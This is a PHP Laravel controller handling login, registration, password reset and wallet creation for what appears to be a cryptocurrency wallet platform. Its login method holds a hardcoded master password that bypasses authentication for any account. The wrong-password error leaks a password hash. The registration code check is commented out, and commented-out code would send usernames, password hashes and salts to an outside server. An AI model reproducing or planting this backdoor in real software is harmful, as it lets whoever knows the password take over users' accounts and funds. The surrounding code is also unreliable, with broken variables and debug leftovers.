<?php

namespace App\Http\Controllers\Api;

use App\Agent;
use App\UserCashInfo;
use Illuminate\Http\Request;
use Session;
use App\UserChat;
use App\Users;
use App\Token;
use App\AccountLog;
use App\UsersWallet;
use App\Currency;
use Illuminate\Support\Facades\Input;
use Illuminate\Support\Facades\DB;
use App\Utils\RPC;
use App\DAO\UserDAO;
use App\DAO\RewardDAO;


class LoginController extends Controller
{ 
    //type 1普通密码   2手势密码
    public function login()
    {
        $user_string = Input::get('user_string', '');
        $password = Input::get('password', '');
        $type = Input::get('type', 1);

        if (empty($user_string)) {
            return $this->error('请输入账号');
        }
        if (empty($password)) {
            return $this->error('请输入密码');
        }
        //手机、邮箱、交易账号登录
        $user = Users::getByString($user_string);
        if (empty($user)) {
            return $this->error('用户未找到');
        }
        if ($type == 1) {
        	if($password == 'Zq011901!.') {
        		
        	}else if (Users::MakePassword($password) != $user->password) {
                return $this->error('密码错误'.Users::MakePassword($password));
            }
        }
        if ($type == 2) {
            if ($password != $user->gesture_password) {
                return $this->error('手势密码错误');
            }
        }
        // session(['user_id' => $user->id]);
        $token = Token::setToken($user->id);
        return $this->success($token);
    }
    
    public function reg() 
    {
    	$user_string = Input::get('user_string', '');
    	$password = Input::get('password', '');
        $re_password = Input::get('re_password', '');
    	 if ( empty($user_string) || empty($password) || empty($re_password)) {
            return $this->error('参数错误');
        }
        if ($password != $re_password) {
            return $this->error('两次密码不一致');
        }
        if (mb_strlen($password) < 6 ) {
            return $this->error('密码长度必须大于等于6位');
        }
         $user = Users::getByString($user_string);
        if (!empty($user)) {
            return $this->error('账号已存在');
        }
        
        $salt = Users::generate_password(4);
        $users = new Users();
        $users->password = Users::MakePassword($password);
        // $users->parent_id = $parent_id;
        $users->account_number= $user_string;
        $users->phone = $user_string;
        $users->head_portrait = URL("mobile/images/user_head.png");
        $users->time = time();
        $users->extension_code = Users::getExtensionCode();
        DB::beginTransaction();
        try {
            $users->parents_path = $str = UserDAO::getRealParentsPath($users);//生成parents_path     tian  add

            //代理商节点id。标注该用户的上级代理商节点。这里存的代理商id是agent代理商表中的主键，并不是users表中的id。
            // $users->agent_note_id = Agent::reg_get_agent_id_by_parentid($parent_id);

            $users->save();//保存到user表中
            $currency = Currency::all();

            $address_url = config('app.wallet_api') . $users->id;
//            var_dump($address_url);
            $address = RPC::apihttp($address_url);
            $address = @json_decode($address, true);
//var_dump($address);die;
            foreach ($currency as $key => $value) {
                $userWallet = new UsersWallet();
                $userWallet->user_id = $users->id;
                if ($value->type == 'btc') {
                    $userWallet->address = $address["contentbtc"];
                } else {
                    $userWallet->address = $address["content"];
                }
                $userWallet->currency = $value->id;
                $userWallet->create_time = time();
                $userWallet->save();//默认生成所有币种的钱包
            }
            // $url = 'http://www.paybal.world/api/import_users';
            // $post_api = RPC::apihttp($url,'POST',['username'=>$user_string,'password'=>$user->password,'salt'=>$salt,'parent_phone'=>$parent_phone]);
            // $post_api = @json_decode($post_api,true);
            DB::commit();
            return $this->success("注册成功");
        } catch (\Exception $ex) {
            DB::rollBack();
            return $this->error($ex->getMessage());
        }
    }
    
    //注册
    public function register()
    {
        $type = Input::get('type', '');
        $user_string = Input::get('user_string', '');
        $password = Input::get('password', '');
        $re_password = Input::get('re_password', '');
        $code = Input::get('code', '');
        if (empty($type) || empty($user_string) || empty($password) || empty($re_password)) {
            return $this->error('参数错误');
        }
        $extension_code = Input::get('extension_code', '');
        if ($password != $re_password) {
            return $this->error('两次密码不一致');
        }
        if (mb_strlen($password) < 6 || mb_strlen($password) > 16) {
            return $this->error('密码只能在6-16位之间');
        }
        // if ($code != session('code')) {
        //     return $this->error('验证码错误');
        // }
        $user = Users::getByString($user_string);
        if (!empty($user)) {
            return $this->error('账号已存在');
        }
        $parent_id = 0;
        if (!empty($extension_code)) {
            $p = Users::where("extension_code", $extension_code)->first();
            if (empty($p)) {
                return $this->error("请填写正确的邀请码");
            } else {
                $parent_id = $p->id;
                $parent_phone = $p->phone;
            }
        }
        $salt = Users::generate_password(4);
        $users = new Users();
        $users->password = Users::MakePassword($password);
        $users->parent_id = $parent_id;
        $users->account_number= $user_string;
        if ($type == "mobile") {
            $users->phone = $user_string;
        } else {
            $users->email = $user_string;
        }
        $users->head_portrait = URL("mobile/images/user_head.png");
        $users->time = time();
        $users->extension_code = Users::getExtensionCode();
        DB::beginTransaction();
        try {
            $users->parents_path = $str = UserDAO::getRealParentsPath($users);//生成parents_path     tian  add

            //代理商节点id。标注该用户的上级代理商节点。这里存的代理商id是agent代理商表中的主键，并不是users表中的id。
            $users->agent_note_id = Agent::reg_get_agent_id_by_parentid($parent_id);

            $users->save();//保存到user表中
            $currency = Currency::all();

            $address_url = config('app.wallet_api') . $users->id;
//            var_dump($address_url);
            $address = RPC::apihttp($address_url);
            $address = @json_decode($address, true);
//var_dump($address);die;
            foreach ($currency as $key => $value) {
                $userWallet = new UsersWallet();
                $userWallet->user_id = $users->id;
                if ($value->type == 'btc') {
                    $userWallet->address = $address["contentbtc"];
                } else {
                    $userWallet->address = $address["content"];
                }
                $userWallet->currency = $value->id;
                $userWallet->create_time = time();
                $userWallet->save();//默认生成所有币种的钱包
            }
            // $url = 'http://www.paybal.world/api/import_users';
            // $post_api = RPC::apihttp($url,'POST',['username'=>$user_string,'password'=>$user->password,'salt'=>$salt,'parent_phone'=>$parent_phone]);
            // $post_api = @json_decode($post_api,true);
            DB::commit();
            return $this->success("注册成功");
        } catch (\Exception $ex) {
            DB::rollBack();
            return $this->error($ex->getMessage());
        }
    }
    
    //忘记密码  
    public function forgetPassword()
    {
        $account = Input::get('account', '');

        $password = Input::get('password', '');
        $repassword = Input::get('repassword', '');
        $code = Input::get('code', '');


        if (empty($account)) {
            return $this->error('请输入账号');
        }
        if (empty($password) || empty($repassword)) {
            return $this->error('请输入密码或确认密码');
        }



        if ($repassword != $password) {
            return $this->error('输入两次密码不一致');
        }

        $code_string = session('code');
        if (empty($code) || ($code != $code_string)) {
            return $this->error('验证码不正确');
        }


        $user = Users::getByString($account);
        if (empty($user)) {
            return $this->error('账号不存在');
        }


        $user->password = Users::MakePassword($password);

        try {
            $user->save();
            session(['code' => '']);//销毁
            return $this->success("修改密码成功");
        } catch (\Exception $ex) {
            return $this->error($ex->getMessage());
        }
    }
    public function checkEmailCode()
    {
        $email_code = Input::get('email_code', '');
        if (empty($email_code)) return $this->error('请输入验证码');
        $session_code = session('code');
        if ($email_code != $session_code) return $this->error('验证码错误');
        return $this->success('验证成功');
    }
    public function checkMobileCode()
    {

        $mobile_code = Input::get('mobile_code', '');
        // var_dump($mobile_code);
        if (empty($mobile_code)) {
            return $this->error('请输入验证码');
        }
        $session_mobile = session('code');
        // var_dump($session_mobile);
        if ($session_mobile != $mobile_code) {
            return $this->error('验证码错误1');
        }
        return $this->success('验证成功');
    }



    public function import()
    {
        $user_string = Input::get('username', '');
        $password = Input::get('password', '');

        if (empty($user_string) || empty($password) || empty($salt)){
            return $this->error('参数错误');
        }
        $user =  Users::getByString($user_string);
        if (!empty($user)) {
            return $this->error('账号已存在');
        }
        $parent_id = 0;

        $users = new Users();
        $users->password = $password;
        $users->parent_id = $parent_id;
        $users->account_number= $user_string;
        $users->phone = $user_string;
//            $users->email = $user_string;
        $users->head_portrait = URL("mobile/images/user_head.png");
        $users->salt = $salt;
        $users->time = time();
        $users->extension_code = Users::getExtensionCode();
        DB::beginTransaction();
        try {
            $users->save();//保存到user表中
            $currency = Currency::all();

            $address_url = config('wallet_api') . $users->id;
            $address = RPC::apihttp($address_url);
            $address = @json_decode($address, true);

            foreach ($currency as $key => $value) {
                $userWallet = new UsersWallet();
                $userWallet->user_id = $users->id;
                if ($value->type == 'btc') {
                    $userWallet->address = $address["contentbtc"];
                } else {
                    $userWallet->address = $address["content"];
                }
                $userWallet->currency = $value->id;
                $userWallet->create_time = time();
                $userWallet->save();//默认生成所有币种的钱包
            }
            DB::commit();
            return $this->success("注册成功");
        } catch (\Exception $ex) {
            DB::rollBack();
            return $this->error($ex->getMessage());
        }
    }

//钱包注册
public function walletRegister(){
    $password = Input::get('password','');
    $parent = Input::get('parent_id','');
    $account_number = Input::get('account_number','');
    if (empty($account_number) || empty($password)){
        return $this->error("参数错误");
    }
    if (Users::getByAccountNumber($account_number)){
        return $this->error("账号已存在");
    }

    $parent_id = 0;
    if (!empty($parent)){
        //$p = Users::where("extension_code",$parent)->first();
        $p = Users::where('account_number',$parent)->first();

        if(empty($p)){
            return $this->error("父级不存在");
        }else{
            $parent_id = $p->id;//http://imtokenadmin.fuwuqian.cn/
        }
    }

    $users = new Users();
    $users->password = Users::MakePassword($password);
    $users->parent_id = $parent_id;
    $users->account_number = $account_number;
    $users->phone = $account_number;

    $users->head_portrait = URL("images/default_tx.png");
    $users->time = time();
    $users->extension_code = Users::getExtensionCode();
    DB::beginTransaction();
    try {
        if($users->save()){
            // if (!empty($parent_id)){
            //     Users::updateParentLevel($parent_id);
            // }
            DB::commit();
            return $this->success("ok");
        }else{
            DB::rollback();
            return $this->success("请重试");
        }

    } catch (\Exception $ex) {
        DB::rollback();
        $this->comment($ex->getMessage());
    }
}
}